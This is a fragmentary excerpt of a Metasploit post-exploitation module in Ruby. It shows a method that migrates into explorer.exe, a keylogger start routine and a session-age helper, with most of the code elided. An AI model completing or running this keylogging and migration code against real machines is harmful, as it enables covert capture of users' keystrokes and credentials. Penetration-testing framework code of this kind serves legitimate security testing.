...
class MetasploitModule < Msf::Post
  ...
  def process_migrate
    ...
    migrate(get_pid("explorer.exe"), "explorer.exe", session.sys.process.getpid)
  end
  ...
  def start_keylogger
    begin
      ...
      nil
    end # Stop keyscan if it was already running for some reason.
    begin
  ...
  def get_session_age
    Time.now.to_i - session.last_checkin.to_i
  end
